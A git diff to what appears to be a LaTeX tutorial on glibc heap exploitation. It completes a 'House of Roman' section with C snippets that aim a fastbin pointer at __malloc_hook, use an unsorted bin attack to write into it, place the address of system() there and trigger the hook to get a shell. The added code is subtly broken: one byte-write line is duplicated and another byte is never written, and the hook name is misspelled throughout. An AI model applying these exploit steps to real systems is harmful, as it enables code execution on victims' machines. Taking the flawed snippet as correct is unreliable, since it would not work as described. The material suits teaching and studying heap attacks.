@@ -1663,8 +1663,8 @@ Finally, we trigger the attack by one allocation.
  malloc(10);
 \end{lstlisting}
 
-\subsection{The House of roman = NOT FINISH YET}
-The main goal of this attack is to get shell access by a combination of \ub{} attack and Use after the free attack.
+\subsection{The House of roman}
+The main goal of this attack is to get shell access by point the FD pointer to \lstinline{malloc_hock} and write \emph{one-gadget} to \lstinline{malloc_hock} with a combination of \ub{} attack , \fb{}attack and Use after the free attack.
 
 The first step is to get a pointer inside \emph{\lstinline{malloc_hook}}. \lstinline{malloc_hook} lets us modify the behavior of \lstinline{malloc} and \lstinline{free} with a hook function. To achieve this, we create a \fb{} chunk in a way the \lstinline{fd} pointer points to \lstinline{malloc_hook}.
 \begin{lstlisting}[language=c,frame=tlrb]
@@ -1722,8 +1722,27 @@ uint8_t* malloc_hook_chunk = malloc(0x60);
 First, we calculate the address of \lstinline{__malloc_hook}. We have an address inside libc, which keeps inside the \lstinline{fd} pointer of \lstinline{fake_libc_chunk}. We calculate the offset between the start of libc and \lstinline{main_arena+0x68}, which keep in the \lstinline{fd} pointer. In the next step, find the offset of \lstinline{__malloc_hook} inside the libc. The distance between these two offsets is 0xe8.
 We want to use  0x7f as a valid \fb{} chunk size; to do that, we subtract \lstinline{__malloc_hook} by 0X23. With two malloc \lstinline{fastbin_victim} and \lstinline{fake_libc_chunk} remove from \fb{}, the final malloc returns the \lstinline{malloc_hook_chunk}.
 
-As we talk before, the unsorted bin attack let us write a value in a controlled location. The final goal of the attack is to get the shell access; to do this, we need to have the libc address.
-
+As we talk before, the \ub{} attack let us write a value in a controlled location. At this stage , we use \ub{} attack in order to change the value inside \lstinline{malloc_hock} with the \lstinline{main_arena + 0x68}. 
+\begin{lstlisting}[language=c,frame=tlrb]
+uint8_t* unsorted_bin_ptr = malloc(0x80);
+malloc(0x30);
+free(unsorted_bin_ptr);
+__malloc_hook_adjust = __malloc_hook - 0x10;
+byte1 = (__malloc_hook_adjust) & 0xff; 
+byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 
+unsorted_bin_ptr[8] = byte1;
+unsorted_bin_ptr[9] = byte2;
+malloc(0x80);
+\end{lstlisting}
+In the last steps, we write a one gadget inside the \lstinline{malloc_hock} and trigger attack with one allocation.
+\begin{lstlisting}[language=c,frame=tlrb]
+long long system_addr = (long long)dlsym(RTLD_NEXT, "system");
+malloc_hook_chunk[19] = system_addr & 0xff;
+malloc_hook_chunk[20] = (system_addr >> 8) & 0xff;
+malloc_hook_chunk[20] = (system_addr >> 8) & 0xff;
+malloc_hook_chunk[22] = (system_addr >> 24) & 0xff;
+malloc((long long)shell);
+\end{lstlisting}
 \subsection{The House of Rabbit}
 
 This attack used a \Fb{} and \lstinline{UAF} attack to forge a fake heap chunk for feature uses. As we mentioned before, every fast bin keeps a single size chunk with a single linked list. What happens if we change a chunk inside the \fb{}? In allocation, \fb{} detects the abnormal size so aborts the allocation. If we force the heap manager to call \mallocc{} inorder to consolidate, this chunk merge and split into \sbs{}. As a result, we have two valid but forged chunks in a \sbs{} which overlap which other. Consider the following code:
